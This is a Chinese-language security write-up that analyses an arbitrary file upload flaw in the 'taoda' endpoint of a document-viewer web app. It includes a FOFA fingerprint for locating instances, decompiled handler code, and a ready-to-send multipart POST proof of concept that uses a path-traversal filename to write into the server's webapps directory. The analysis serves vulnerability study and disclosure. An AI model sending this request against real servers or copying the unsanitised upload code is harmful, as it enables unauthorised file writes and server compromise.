## fofa指纹

```
js_name="www/lib/ionic/js/ionic.bundle.min.js"
```

## 框架结构

整体框架结构也很简单（不知道是不是因为代码不完整）。`docviewer-webapp`文件夹下包含`WEB-INF`和`META-INF`两个文件夹。
```
WEB-INF
    |-classes
        |-com
            |- grcspsmartdot
                |- grcsp
                    |- doc
                        |- bootstrap
                            |- DocViewerServiceBootStrap
                            |- ServletIndexListener
                        |- controller
                            |- ConvertHtmlController
                            |- ConvertToOneController
                            |- DocViewerController
                            |- HealthCheckController
                            |- SystemConfigurationController
                            |- WordOperationController
        |-spring
            |- docviewer-context.xml
            |- docviewer-servlet.xml
    |-jsp
        ｜- healthCheck.jsp
        ｜- mview.jsp
        ｜- parameter.jsp
        ｜- view.jsp
    |-lib
    |-static
    |-web.xml <!-- servlet由spring来处理-->
    |-web.xml_2_5
    |-web.xml_3_0
    |-weblogic.xml
```

web.xml中的配置很简单，只声明servlet都由spring来处理。spring配置引入的是`WEB-INF\classes\spring`文件夹下的文件。跟进一下`docviewer-servlet.xml`

```xml
	<mvc:resources location="/resources/" mapping="/resources/**" cache-period="3600" />
	<mvc:resources mapping="/static/doc/**" location="file:///${docviewer.localFilePath}/doc/" />
	<mvc:resources mapping="/static/**" location="/WEB-INF/static/" />
	
	<mvc:view-controller path="/docViewer" view-name="/view" />
	<mvc:view-controller path="/mdocViewer" view-name="/mview" />
	<mvc:view-controller path="/healthCheck" view-name="/healthCheck" />
	<mvc:view-controller path="/clearHasConvertDocs" view-name="/clearHasConvertDocs" />
	<mvc:view-controller path="/admin/parameterSetting" view-name="/parameter" />

	<bean id="viewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
		<property name="prefix" value="/WEB-INF/jsp/" />
		<property name="suffix" value=".jsp"></property>
	</bean>
```
**jsp的路由**
`<mvc:view-controller>`元素中的`view-name`属性指定了与特定URL路径关联的视图的名称。例如`<mvc:view-controller path="/docViewer" view-name="/view" />`意思即为访问`/docViewer`路径时，会由`/view`视图来处理。xml最后定义了视图解析器，会将逻辑视图名称映射到`/WEB-INF/jsp/`下的JSP文件。

**servlet的路由**
spring框架要么在配置文件中配置路由，要么可能用了注解的方式。查看Controller文件夹下的类，写法如下。那么可以认定组件用spring注解的方式来定义路由。

```java
@RestController
@RequestMapping({"/wordOperationRest"})
public class WordOperationController {
    private static final Logger log = LoggerFactory.getLogger(WordOperationController.class);

    @RequestMapping(
        value = {"/taoda"},
        method = {RequestMethod.POST},
        produces = {"application/json"}
    )
    @ResponseBody
    public Object taoda(@RequestParam(value = "bodymarkname",required = false) String bodymarkname, HttpServletRequest request, HttpServletResponse response) {
        return this.docTaoDaDeal(request, response, bodymarkname); // 实际处理方法
    }
```

### taoda任意文件上传漏洞

2023年HW期间爆出一个漏洞—taoda任意文件上传漏洞。对应的就是上面提到的这个路由。`taoda`实际会走到`docTaoDaDeal`方法来处理。该方法存在明显的文件上传处理逻辑。

```java
private Object docTaoDaDeal(HttpServletRequest request, HttpServletResponse response, String bodymarkname) {
        WordAttInfo wordAtt = null;

        try {
            wordAtt = new WordAttInfo();
            if (null != bodymarkname && bodymarkname.trim().length() > 0) {
                wordAtt.setBodyMarkName(bodymarkname);
            }

            DiskFileItemFactory factory = new DiskFileItemFactory();
            ServletFileUpload upload = new ServletFileUpload(factory);
            request.setCharacterEncoding("utf-8");
            upload.setHeaderEncoding("utf-8");
            if (ServletFileUpload.isMultipartContent(request)) {
                List<FileItem> list = upload.parseRequest(request);
                Iterator i$ = list.iterator();

                String fileParamName;
                String filename;
                String decodeValue;
                while(i$.hasNext()) {
                    FileItem item = (FileItem)i$.next();
                    if (item.isFormField()) { // isFormField返回true代表:表单处理逻辑
                        fileParamName = item.getFieldName();
                        filename = item.getString("utf-8");
                        decodeValue = URLDecoder.decode(filename, "utf-8");
                        if (fileParamName.toLowerCase().equals("data")) {
                            log.debug("传入的data数据:" + decodeValue);
                            wordAtt.setJsonData(decodeValue);
                        }

                        if (fileParamName.toLowerCase().equals("bodymark") && filename.trim().length() > 0) {
                            wordAtt.setBodyMarkName(decodeValue);
                        }
                    } else { // isFormField返回false代表:文件上传处理逻辑
                        fileParamName = item.getFieldName(); // 获取表单名称
                        filename = item.getName(); // 获取上传的文件名
                        filename = filename.substring(filename.lastIndexOf("\\") + 1); // 获取最后一个反斜杠的\的位置
                        if (filename != null && !filename.trim().equals("")) {
                            boolean isHaveDocFile = false;
                            if (fileParamName.toLowerCase().indexOf("doc") > -1) {
                                wordAtt.docListAdd(filename);
                                isHaveDocFile = true;
                            }

                            if (fileParamName.toLowerCase().equals("template")) {
                                wordAtt.setTemplateName(filename);
                                isHaveDocFile = true;
                            }

                            if (isHaveDocFile) {
                                if (null == wordAtt.getTmpDirectory()) { 
                                    String tmpDirectoryName = Util.md5(System.currentTimeMillis() + filename);
                                    wordAtt.setTmpDirectoryName(tmpDirectoryName);
                                    String tDirectory = DocviewConfig.getString("docviewer.localFilePath") + "\\doc\\taoda\\" + tmpDirectoryName;
                                    wordAtt.setTmpDirectory(tDirectory); //  tmp目录
                                    Util.createDir(tDirectory);
                                    log.info("生成套打文件临时目录:" + tDirectory);
                                }

                                File uploadFile = new File(wordAtt.getTmpDirectory() + "\\" + filename); // filename是传入的
                                item.write(uploadFile);
                            }

                            item.delete();
                        }
                    }
                }

                WordTaoDaService wdService = new WordTaoDaService();
                wdService.taoda(wordAtt);
            } 
        } 
```

如果上述`isFormField`返回`false`就会当成文件上传来处理。而`isFormField`方法实际是根据`Content-Disposition`头部的`form-data`是否匹配到文件来判断的。普通文本和文件的`Content-Disposition`区别如下

```
# 普通文本
Content-Disposition: form-data; name="username"
# 文件
Content-Disposition: form-data; name="file"; filename="example.txt"
```

那么想要上传文件，就需要请求包构造时其中一个字段包含filename。

最终的POC如下

```
POST /_api/docviewer-webapp/wordOperationRest/taoda HTTP/1.1 
Host: ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuu0budsPuEXH7dY4
Content-Length: 446

------WebKitFormBoundaryuu0budsPuEXH7dY4
Content-Disposition: form-data; name="bodymarkname"

taoda
------WebKitFormBoundaryuu0budsPuEXH7dY4
Content-Disposition: form-data; name="template"

1111
------WebKitFormBoundaryuu0budsPuEXH7dY4
Content-Disposition: form-data; name="doc"; filename="../../../../fjzh/apache-tomcat-7.0.67/webapps/docviewer-webapp/1.txt"
Content-Type: images/gif

123 
------WebKitFormBoundaryuu0budsPuEXH7dY4--
```

